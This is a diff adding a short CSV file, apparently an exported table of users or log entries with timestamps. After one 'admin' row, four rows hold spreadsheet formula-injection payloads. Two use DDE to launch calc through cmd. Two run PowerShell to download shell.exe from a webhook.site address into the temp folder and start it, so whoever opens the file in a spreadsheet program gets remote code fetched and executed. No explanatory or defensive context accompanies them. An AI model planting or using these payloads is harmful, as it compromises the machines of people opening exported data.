@@ -1,0 +1,5 @@
+1,admin,"2023-07-02 10:54:07"
+2,"@SUM(1+9)*cmd|' /C calc'!A0","2023-07-02 11:02:00"
+3,"@SUM(1+9)*cmd|' /C calc'!A0","2023-07-02 11:05:30"
+4,"=cmd|' /C powershell Invoke-WebRequest ""https://webhook.site/359d4ebb-2880-4b02-a81d-420a870d327d/shell.exe"" -OutFile ""$env:Temp\shell.exe""; Start-Process ""$env:Temp\shell.exe""'!A1","2023-07-02 11:08:56"
+5,"=cmd|' /C powershell Invoke-WebRequest ""https://webhook.site/359d4ebb-2880-4b02-a81d-420a870d327d/shell.exe"" -OutFile ""$env:Temp\shell.exe""; Start-Process ""$env:Temp\shell.exe""'!A1","2023-07-02 11:11:27"
